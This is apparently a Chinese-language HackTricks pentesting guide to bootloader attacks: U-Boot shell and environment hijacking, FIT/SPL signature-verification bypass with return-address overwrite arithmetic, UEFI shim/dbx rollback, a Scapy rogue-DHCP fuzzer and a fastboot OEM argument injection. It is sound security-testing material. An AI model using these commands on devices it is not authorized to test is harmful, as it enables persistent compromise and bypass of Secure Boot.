# Bootloader 测试

{{#include ../../banners/hacktricks-training.md}}

以下步骤适用于修改设备启动配置，以及测试 U-Boot 和 UEFI 类加载器等 bootloader。重点是尽早实现代码执行、评估签名/回滚保护，并滥用恢复或网络启动路径。

相关内容：通过 patching bl2_ext 绕过 MediaTek secure-boot：

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 快速突破与环境滥用

1. 访问解释器 shell
   - 启动期间，在 `bootcmd` 执行前按下已知的中断键（通常是任意键、0、空格，或特定于主板的“魔法”按键序列），进入 U-Boot 提示符。<sup>[[1]](#references)</sup>

2. 检查启动状态和变量
   - 有用的命令：
     - `printenv`（转储环境变量）
     - `bdinfo`（主板信息、内存地址）
     - `help bootm; help booti; help bootz`（支持的内核启动方法）
     - `help ext4load; help fatload; help tftpboot`（可用的加载器）

3. 修改启动参数以获取 root shell
   - 添加 `init=/bin/sh`，让内核进入 shell，而不是执行常规 init：
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. 从你的 TFTP server 进行网络启动
   - 配置网络并从 LAN 获取 kernel/FIT image：
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. 通过环境持久化更改
   - 如果 env 存储未受写保护，你可以持久化控制：
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - 检查是否存在影响回退路径的变量，例如 `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets`。配置错误的值可能允许反复中断启动流程并进入 shell。

6. 检查调试/不安全功能
   - 查找以下情况：`bootdelay` > 0、禁用 `autoboot`、不受限制的 `usb start; fatload usb 0:1 ...`、通过串口使用 `loady`/`loads` 的能力、从不可信介质执行 `env import`，以及未经签名检查就加载内核/ramdisk。

7. U-Boot 镜像/验证测试
   - 如果平台声称使用 FIT 镜像实现 secure/verified boot，请尝试使用未签名和遭篡改的镜像：
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - 缺少 `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE`，或采用旧版 `verify=n` 行为，通常会允许启动任意 payload。
   - 不要只看简单的允许/拒绝结果：近期的 FIT 研究表明，验证路径本身也可能是 pre-auth 攻击面。对外部存储的 FIT 数据（`data-offset`、`data-position`、`data-size`）、签名配置选择、`loadables` 以及 overlay / `extra-conf` 处理进行负向测试。
   - 如果你有匹配的源码树，`test/vboot/vboot_test.sh` 可以快速在 U-Boot sandbox 中重现 FIT 验证行为，无需先接触真实硬件。<sup>[[10]](#references)</sup>

8. Standard Boot（`bootstd`）、`extlinux` 和脚本 bootflows
   - 在现代 U-Boot 构建中，`bootcmd` 通常只是 Standard Boot 的封装。这意味着，即使可见的环境看起来无害，可写介质、PXE 或 SPI flash 也可能成为真正的信任边界。
   - `extlinux` bootmeth 会在 `/` 和 `/boot` 下搜索 `extlinux/extlinux.conf`；script bootmeth 会先搜索 `boot.scr.uimg`，然后搜索 `boot.scr`。网络启动时，脚本文件名可能来自 `boot_script_dhcp`。
   - 实用的初步排查命令：
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - 要测试的滥用场景：攻击者控制的 USB/SD 介质在 `boot_targets` 中排位更靠前、可写的 `/boot/extlinux/extlinux.conf`、提供 `boot.scr` 的恶意 TFTP，或通过 SPI 执行脚本的 `script_offset_f`。
   - 如果平台依赖 FIT verification，请确保配置是在配置级别签名，而不只是对各个映像单独签名；`required-mode=all` 比接受任意一个必需密钥更严格。

### SPL 在验证前复制外部 FIT 数据

对于 SPL FIT 加载，配置签名完好并不意味着外部 payload metadata 是安全的。U-Boot 会将 `data-position`、`data-offset` 和 `data-size` 排除在已签名的配置属性之外。在受影响的 `load_simple_fit()` 路径中，SPL 会根据这些字段计算源偏移和复制长度，然后在检查映像哈希**之前**调用 `info->read()`。因此，攻击者可以在可写启动介质上放置特制 FIT，在不伪造签名的情况下覆盖 RAM。签名的 `load` 属性通常会固定目标地址，因此首先要确定超大复制是否能从该地址触及栈或其他控制数据。<sup>[[15]](#references)[[16]](#references)</sup>

追踪目标板实际使用的加载器和内存映射，不要假定它会读取 flash：演示所用的 RAM loader 调用了 `spl_ram_load_read()` 和 `memcpy()`。在调用点记录 `fit_offset` 以及 reader 添加的任何 FIT 基址、加载器的块长度（`spl_get_bl_len(info)`）、任何特定分支的对齐方式、计算得到的 `read_offset` 和传输 `size`、目标 `src_ptr`，以及保存的返回地址所在位置。检查是否存在连续映射的源区域，足以覆盖所需的复制距离；该区域是否与目标重叠；以及源位置的字节能否提供一个指向攻击者控制的 FIT 数据的指针。如果完整指针无法满足加载器的对齐约束，则可使用通用的[部分返回地址覆盖技术](../../binary-exploitation/stack-overflow/ret2win/)。<sup>[[16]](#references)</sup>

在研究人员使用的 32 位 AST2600 测试构建中，`src_ptr` 为 `0x80001000`，`memcpy` 保存的返回地址位于 `0x902ffe24`。他们使用了一个上游构建，并修改了栈的位置和对齐辅助函数，使其与 OpenBMC 一致：RAM reader 添加了 `0x10000` 的 FIT 基址，这些辅助函数则会将源偏移向下取整到 `ARCH_DMA_MINALIGN`（64 字节）。在 `0x902fffe4` 处放置一个合适的小端序指针，并让复制在最后一个字节之前结束，只修改了保存的返回地址的低三字节，同时保留了已知为零的高字节。上游 RAM loader 使用的块长度则为一个字节，因此这种 64 字节对齐和部分覆盖变通方案并非通用的 SPL 要求。针对每个构建，重新推导地址、加载器块长度和复制范围。下方原始计算中的 `fit_offset` 指 RAM reader 添加的有效 FIT 基址，不一定是传递给 `load_simple_fit()` 的参数。<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

上游修复在调用 `info->read()` 前，同时限制了原始 `data-size` 和**按块对齐的**传输大小。其 overlay 路径会传入实际缓冲区容量，而其他调用方使用 `CONFIG_SYS_BOOTM_LEN`；这只是一个宽松的上限，并不能证明目标内存中有这么多可用空间。评估 vendor fork 时，请确认这些检查确实存在，并将允许的复制范围与板子的实际 SPL stack 和保留区域进行比较。<sup>[[15]](#references)[[16]](#references)</sup>

## Network-boot surface (DHCP/PXE) and rogue servers

9. PXE/DHCP 参数 fuzzing
   - U-Boot 的旧版 BOOTP/DHCP 处理逻辑曾出现内存安全问题。例如，CVE‑2024‑42040 描述了通过精心构造的 DHCP 响应泄露内存的情况，这类响应可能会将 U-Boot 内存中的字节泄露到网络上。<sup>[[4]](#references)</sup>使用过长或边界情况的值测试 DHCP/PXE 代码路径（option 67 bootfile-name、vendor options、file/servername 字段），并观察是否出现挂起或 leak。
   - 用于在 netboot 期间测试启动参数的最小 Scapy 代码片段：
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - 另外，验证 PXE filename 字段传递给 shell/loader 逻辑并继续传入 OS 侧配置脚本时，是否未经清理。

10. Rogue DHCP server 命令注入测试
   - 设置 rogue DHCP/PXE 服务，并尝试在 filename 或 options 字段中注入字符，以便在启动链后续阶段触达命令解释器。Metasploit 的 DHCP auxiliary、`dnsmasq` 或自定义 Scapy 脚本都很适用。请先隔离实验室网络。

## SoC ROM 恢复模式（可覆盖正常启动）

许多 SoC 提供 BootROM“loader”模式，即使 flash 镜像无效，也会通过 USB/UART 接收代码。如果 secure-boot 熔丝未熔断，这可能让攻击者在启动链非常早期就获得任意代码执行。

- NXP i.MX（Serial Download Mode）
  - 工具：`uuu` (mfgtools3) 或 `imx-usb-loader`。
  - 示例：`imx-usb-loader u-boot.imx`，将自定义 U-Boot 推送到 RAM 并运行。
- Allwinner（FEL）
  - 工具：`sunxi-fel`。
  - 示例：`sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 或 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip（MaskROM）
  - 工具：`rkdeveloptool`。
  - 示例：`rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`，暂存 loader 并上传自定义 U-Boot。

评估设备是否已烧录 secure-boot eFuses/OTP。如果没有，BootROM 下载模式通常可以绕过更高层级的验证（U-Boot、kernel、rootfs），直接从 SRAM/DRAM 执行你的第一阶段 payload。

## UEFI/PC 类 bootloader：快速检查

11. ESP 篡改、回滚和密钥注册测试
   - 挂载 EFI System Partition (ESP)，并检查 loader 组件：`EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、厂商 logo 路径。
   - 在可能的情况下，从 OS 中导出 Secure Boot 状态和密钥数据库：
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - 如果平台处于 Setup Mode、接受未经身份验证的密钥注册，或出厂时使用测试/默认 Platform Key（PKfail 类问题），本地管理员或具有物理访问权限的攻击者就可以注册自己的 KEK/db，同时让 Secure Boot 看起来仍处于“启用”状态，却能启动任意 EFI 二进制文件。<sup>[[3]](#references)</sup>
   - 如果 Secure Boot 撤销列表（dbx）不是最新的，可以尝试使用降级版本或已知存在漏洞的签名启动组件启动。如果平台仍信任旧版 shim/bootmanager，通常就能从 ESP 加载自己的内核或 `grub.cfg`，以获得持久化能力。
   - 在 Windows 上，如果固件 `dbx` 中仍缺少 `Microsoft Windows Production PCA 2011` 签名者，即使主机已安装补丁，仍可能接受存在漏洞的签名 boot manager；BlackX 中观察到了这种情况。<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop 风格的绕过可以注册攻击者的 MOK；之后，合法的 shim 就能在后续启动时加载由该密钥签名的 EFI payload。<sup>[[12]](#references)[[13]](#references)</sup> 即使之后撤销旧的 Windows 签名者，也不会移除已注册的 MOK；因此，只要该 shim 仍受信任，基于 shim 的攻击路径就可以持续存在。<sup>[[12]](#references)</sup>
   - 在经过授权的 UEFI 机器上测试此回滚路径之前，应检查**固件实际生效的撤销状态**，而不只是查看 Windows 更新历史记录。<sup>[[13]](#references)[[14]](#references)</sup> Microsoft 提供了以下只读的提权 PowerShell 检查命令，用于检查 `dbx` 中的 2011 签名者：<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` 只是线索：请在可恢复的实验环境中确认具体的签名启动组件及其他撤销项。<sup>[[12]](#references)[[14]](#references)</sup> 待处理的注册表更新或过期的签名证书，并不等同于已完成的 `dbx` 撤销。<sup>[[13]](#references)[[14]](#references)</sup>

12. 过时 shim / SBAT / dbx 撤销测试
   - 如果撤销项过时，旧版 Microsoft 签名的 shim 和厂商分支仍可能成为 BYOVD 式 bootkit 攻击路径。在隔离的实验环境中，将历史上存在漏洞的 shim 放到 ESP 上，并尝试链式加载你自己的 `grubx64.efi` 或内核。<sup>[[11]](#references)</sup>
   - 快速初步排查：
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - 如果 shim 尽管已在撤销列表中仍能运行，说明 firmware/OS 的 `dbx` 更新已过时，或者它信任了一个从未继承上游 SBAT 保护的分叉 loader。

13. Boot logo 解析漏洞（LogoFAIL 类）
   - 多家 OEM/IBV 的 firmware 存在 DXE 中的图像解析漏洞，影响启动 logo 的处理。如果攻击者能将特制图像放在 ESP 上的厂商特定路径中（例如 `\EFI\<vendor>\logo\*.bmp`），然后重启，那么即使启用了 Secure Boot，也可能在早期启动阶段执行代码。测试平台是否接受用户提供的 logo，以及这些路径是否可从 OS 写入。<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) 信任缺口

对于使用 Qualcomm 的 ABL 加载 **Generic Bootloader Library (GBL)** 的 Android 16 设备，验证 ABL 是否会**验证**它从 `efisp` 分区加载的 UEFI app。如果 ABL 只检查 UEFI app 是否**存在**，而不验证签名，那么对 `efisp` 的写入原语就会转化为启动时的 **pre-OS 无签名代码执行**。<sup>[[6]](#references)[[7]](#references)</sup>

实用检查与利用途径：

- **efisp 写入原语**：需要一种方法将自定义 UEFI app 写入 `efisp`（root/特权服务、OEM app 漏洞、recovery/fastboot 路径）。没有这一条件，就无法直接利用 GBL 加载缺口。<sup>[[6]](#references)</sup>
- **fastboot OEM 参数注入**（ABL 漏洞）：某些 build 会接受 `fastboot oem set-gpu-preemption` 中的额外 token，并将其附加到 kernel cmdline。这可用于强制启用宽松的 SELinux，从而允许写入受保护分区：
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  如果设备已打补丁，该命令应拒绝额外参数。<sup>[[5]](#references)[[6]](#references)</sup>
- **通过持久标志解锁 Bootloader**：Boot 阶段的 payload 可以翻转持久解锁标志（例如 `is_unlocked=1`、`is_unlocked_critical=1`），从而模拟 `fastboot oem unlock`，绕过 OEM 服务器/审批门槛。这会在下次重启后持久改变设备状态。<sup>[[6]](#references)</sup>

防御/分诊说明：

- 确认 ABL 是否会对来自 `efisp` 的 GBL/UEFI payload 执行签名验证。如果不会，应将 `efisp` 视为高风险持久化攻击面。
- 检查 ABL fastboot OEM 处理程序是否已打补丁，以**验证参数数量**并拒绝额外的参数。<sup>[[8]](#references)[[9]](#references)</sup>

## 硬件注意事项

在早期启动期间与 SPI/NAND 闪存交互时（例如，将引脚接地以绕过读取）务必谨慎，并始终查阅闪存数据手册。短接时机不当可能损坏设备或编程器。

## 说明和其他提示

- 尝试使用 `env export -t ${loadaddr}` 和 `env import -t ${loadaddr}` 在 RAM 与存储之间移动环境变量数据块；某些平台允许从可移动介质导入环境变量，且无需身份验证。
- 对于通过 `extlinux.conf` 启动的 Linux 系统，如果未强制执行签名检查，修改启动分区上的 `APPEND` 行（注入 `init=/bin/sh` 或 `rd.break`）通常就足够了。
- 如果目标设备使用双槽/A/B 更新，请查看[固件分析概述](README.md)中的防回滚和槽位失同步技术，避免遗漏 Bootloader 本身之外、仅存在于更新程序中的信任缺口。
- 如果用户空间提供 `fw_printenv/fw_setenv`，请确认 `/etc/fw_env.config` 与实际的环境变量存储位置一致。偏移配置错误可能导致你读写错误的 MTD 区域。

## References

- [1] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [发现 LogoFAIL：系统启动期间图像解析的危险](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail：不可信平台密钥如何削弱 UEFI 生态系统中的安全启动](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 详情](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [抢先解锁：通过两个未净化的字符串解锁 Xiaomi](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit 可让攻击者解锁 Bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [通用 Bootloader（GBL）架构](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg：修复不可信输入传播到内核命令行的问题](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg：为 set-hw-fence-value 命令添加检查](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [无法启动：破坏 U-Boot 的 FIT 签名验证](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [漏洞说明 VU#616257 - Microsoft 签名的 UEFI shim Bootloader 容易受到安全启动绕过攻击](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit：传言得到证实](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX：类似 BlackLotus 的 UEFI bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [如何管理 Secure Boot 变更对应的 Windows Boot Manager 撤销项](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [U-Boot 补丁：读取外部数据前限制其大小](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [隐藏的 FIT 优势：绕过 U-Boot SPL 中的签名验证](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
